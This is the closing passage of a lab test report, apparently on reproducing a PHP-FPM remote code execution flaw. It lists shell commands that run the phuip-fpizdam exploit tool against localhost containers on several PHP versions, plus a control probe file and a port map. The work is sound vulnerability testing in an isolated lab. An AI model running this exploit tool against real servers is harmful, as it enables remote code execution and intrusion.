./poc/phuip-fpizdam/phuip-fpizdam 'http://127.0.0.1:19102/index.php'
./poc/phuip-fpizdam/phuip-fpizdam 'http://127.0.0.1:19103/index.php'

# fixed controls (plain PHP probe, base 200, no candidates)
# recreate apps/wordpress/ctrl11043.php with:
#   <?php echo "CTRL11043 ".PHP_VERSION."\n";
./poc/phuip-fpizdam/phuip-fpizdam 'http://127.0.0.1:19127/ctrl11043.php'
./poc/phuip-fpizdam/phuip-fpizdam 'http://127.0.0.1:19147/ctrl11043.php'
./poc/phuip-fpizdam/phuip-fpizdam 'http://127.0.0.1:19157/ctrl11043.php'
```

Port map for the matrix (host → container): `19101-19105/19107-19108` = PHP 7.3.9; `19111-19115/19117-19118` = 7.3.10; `19121-19125/19127-19128` = 7.3.11; `19131-19135/19137-19138` = 7.2.23; `19141-19145/19147-19148` = 7.2.24; `19151-19155/19157-19158` = 8.4.26; deltas `19109/19110/19171-19175`.

---

*Report generated from measured lab evidence. No claim in this report relies on a shared lab or on a service that was not part of the isolated `t11043` stack.*
